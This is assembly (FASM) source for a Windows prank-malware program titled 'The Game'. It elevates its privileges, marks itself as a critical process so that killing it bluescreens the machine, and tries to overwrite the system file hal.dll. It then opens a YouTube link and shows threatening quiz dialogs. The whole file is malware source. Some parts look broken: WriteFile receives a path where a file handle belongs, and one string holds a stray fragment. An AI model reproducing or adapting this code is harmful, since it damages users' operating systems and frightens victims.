format PE GUI 4.0
include 'include/win32ax.inc'

lea eax, [esp+20]
invoke RtlAdjustPrivilege, 20, 1, 0, eax
invoke RtlSetProcessIsCritical, 1, 0, 0

invoke	WriteFile, leFile, buf, bufsize, byteswritten, 0

invoke ShellExecuteA, NULL, openz, site, NULL, NULL, SW_SHOWNORMAL
invoke Sleep, 5000

invoke MessageBoxA, HWND_DESKTOP, intro, tit, MB_OK
invoke MessageBoxA, HWND_DESKTOP, intro2, tit, MB_OK

invoke MessageBoxA, HWND_DESKTOP, q1, tit, MB_ICONQUESTION+MB_YESNO
cmp eax, IDNO
jne exit

invoke MessageBoxA, HWND_DESKTOP, q2, tit, MB_ICONQUESTION+MB_YESNO
cmp eax, IDYES
jne exit

invoke MessageBoxA, HWND_DESKTOP, q3, tit, MB_ICONQUESTION+MB_YESNO
cmp eax, IDYES
jne exit

invoke MessageBoxA, HWND_DESKTOP, finaltext, tit, MB_ICONQUESTION+MB_YESNO
exit:
	invoke ExitProcess, 0

openz db 'open', 0
site db 'https://www.youtube.com/watch?v=V3KN_bLjzpM', 0
tit db 'The Game', 0
intro db 'Hello. I wanna play a game.', 13, 10, '7	'You will find that something has happened.', 0
intro2 db 'I have taken the liberty of editting some important system DLL files. If you answer incorrectly, your system will bluescreen. Think strong,', 13, 10, 'and remember..the clock is ticking.....', 0
q1 db 'Is rainbowdash best pone?', 0
q2 db 'Are neckbeards hot?', 0
q3 db 'Is notaOS better than TankOS?', 0
finaltext db 'Will your next answer be no?', 0
leFile db 'C:\Windows\System32\hal.dll', 0
buf db 'corrupted :)', 0
bufsize = $ - buf
byteswritten dd ?

source db 'You have won the game for decompiling this! Link to source: http://flatassembler.net/docs.php?article=win32', 0

data import
    library \
	kernel32, 'kernel32', \
	ntdll, 'ntdll', \
	user32, 'user32', \
	Shell32, 'Shell32.dll'
    import user32, \
	MessageBoxA,'MessageBoxA'
    import kernel32, \
	ExitProcess, 'ExitProcess', \
	Sleep, 'Sleep', \
	GetSystemTime, 'GetSystemTime', \
	WriteFile, 'WriteFile'
    import Shell32, \
	ShellExecuteA, 'ShellExecuteA'
    import ntdll, \
	RtlAdjustPrivilege, 'RtlAdjustPrivilege', \
	RtlSetProcessIsCritical, 'RtlSetProcessIsCritical'
end data
